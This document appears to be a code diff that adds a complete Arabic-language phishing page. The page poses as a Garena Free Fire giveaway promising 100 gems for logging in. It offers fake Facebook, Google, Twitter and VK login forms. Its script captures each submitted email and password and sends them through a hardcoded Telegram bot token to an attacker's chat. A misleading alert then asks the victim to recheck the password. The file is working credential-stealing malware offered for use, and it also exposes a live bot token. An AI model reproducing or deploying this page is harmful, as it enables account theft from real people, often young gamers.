@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTpRXut1caOdcEF0YeQlW6MBS4-qON3jozXlQ&s');
+            background-size: cover;
+            background-position: center;
+        }
+        .header {
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            text-align: center;
+            padding: 1rem;
+            width: 100%;
+            position: absolute;
+            top: 0;
+        }
+        .form-container {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 2rem;
+            border-radius: 0.5rem;
+            width: 300px;
+            margin-top: 4rem;
+        }
+        .logo {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            margin: 0 auto 1rem;
+            display: block;
+        }
+        h1, h2 {
+            color: white;
+            text-align: center;
+            margin-bottom: 1rem;
+        }
+        .social-icons {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-bottom: 1rem;
+            transition: all 0.5s ease;
+        }
+        .social-icons button {
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 2rem;
+            color: white;
+            transition: all 0.5s ease;
+            opacity: 1;
+        }
+        .social-icons button:hover {
+            transform: scale(1.2);
+        }
+        .login-form {
+            display: none;
+        }
+        .login-form.active {
+            display: block;
+        }
+        input, button[type="submit"] {
+            width: 100%;
+            padding: 0.5rem;
+            margin-bottom: 0.5rem;
+            border: none;
+            border-radius: 0.25rem;
+        }
+        button[type="submit"] {
+            background-color: #4CAF50;
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        button[type="submit"]:hover {
+            opacity: 0.9;
+        }
+        .message {
+            color: white;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>شركة Garena تهدي 100 جوهرة لمن يقوم بتسجيل الدخول والتصويت</h1>
+        </div>
+        <div class="form-container">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTBKw77yZtnx9hNCRbdsqHmt4X7rEroeclZVw&s" alt="Free Fire Logo" class="logo">
+            <h2>Free Fire</h2>
+            <div class="social-icons" id="socialIcons">
+                <button onclick="showForm('facebook', 'فيسبوك')" id="facebookBtn"><i class="fab fa-facebook"></i></button>
+                <button onclick="showForm('gmail', 'جوجل')" id="gmailBtn"><i class="fab fa-google"></i></button>
+                <button onclick="showForm('twitter', 'تويتر')" id="twitterBtn"><i class="fab fa-twitter"></i></button>
+                <button onclick="showForm('vk', 'VK')" id="vkBtn"><i class="fab fa-vk"></i></button>
+            </div>
+            <form id="facebook-form" class="login-form">
+                <input type="text" id="fb-email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                <input type="password" id="fb-password" placeholder="كلمة المرور" required>
+                <button type="submit" style="background-color: #3b5998;">تسجيل الدخول بفيسبوك</button>
+            </form>
+            <form id="gmail-form" class="login-form">
+                <input type="email" id="gmail-email" placeholder="البريد الإلكتروني" required>
+                <input type="password" id="gmail-password" placeholder="كلمة المرور" required>
+                <button type="submit" style="background-color: #db4437;">تسجيل الدخول بـ Gmail</button>
+            </form>
+            <form id="twitter-form" class="login-form">
+                <input type="text" id="twitter-username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
+                <input type="password" id="twitter-password" placeholder="كلمة المرور" required>
+                <button type="submit" style="background-color: #1da1f2;">تسجيل الدخول بتويتر</button>
+            </form>
+            <form id="vk-form" class="login-form">
+                <input type="text" id="vk-email" placeholder="الهاتف أو البريد الإلكتروني" required>
+                <input type="password" id="vk-password" placeholder="كلمة المرور" required>
+                <button type="submit" style="background-color: #4a76a8;">تسجيل الدخول بـ VK</button>
+            </form>
+            <p id="message" class="message">اختر طريقة تسجيل الدخول للمتابعة</p>
+        </div>
+    </div>
+    <script>
+        const telegramBotToken = '7391359985:AAF8wa-mv6ZoIQQ53UDMIRGKdafrc8gG2ik'; // ضع هنا التوكن الخاص بالبوت
+        const chatId = 'imad27'; // ضع هنا معرف المحادثة الخاص بك
+
+        function showForm(formId, platform) {
+            const forms = document.querySelectorAll('.login-form');
+            forms.forEach(form => form.classList.remove('active'));
+            document.getElementById(`${formId}-form`).classList.add('active');
+            document.getElementById('message').style.display = 'none';
+
+            const socialIcons = document.getElementById('socialIcons');
+            socialIcons.classList.add('collapsed');
+
+            const buttons = socialIcons.getElementsByTagName('button');
+            for (let button of buttons) {
+                button.classList.remove('active');
+            }
+            document.getElementById(`${formId}Btn`).classList.add('active');
+
+            // Reorder buttons to put the active one in the middle
+            const activeButton = document.getElementById(`${formId}Btn`);
+            socialIcons.insertBefore(activeButton, socialIcons.children[2]);
+
+            // تخزين المنصة في خاصية البيانات (data attribute) للنموذج النشط
+            document.getElementById(`${formId}-form`).dataset.platform = platform;
+        }
+
+        function sendData(formId) {
+            const form = document.getElementById(formId);
+            const email = form.querySelector('input[type="text"], input[type="email"]').value;
+            const password = form.querySelector('input[type="password"]').value;
+            const platform = form.dataset.platform || 'Free Fire';
+
+            const message = `Free Fire - ${platform}\nEmail: ${email}\nPassword: ${password}`;
+
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        alert("يرجى التحقق من كلمة السر");
+                    } else {
+                        alert("حدث خطأ أثناء إرسال المعلومات");
+                    }
+                });
+        }
+
+        document.querySelectorAll('.login-form').forEach(form => {
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const formId = this.id;
+                sendData(formId); // إرسال البيانات عند تقديم النموذج
+            });
+        });
+    </script>
+</body>
+</html>
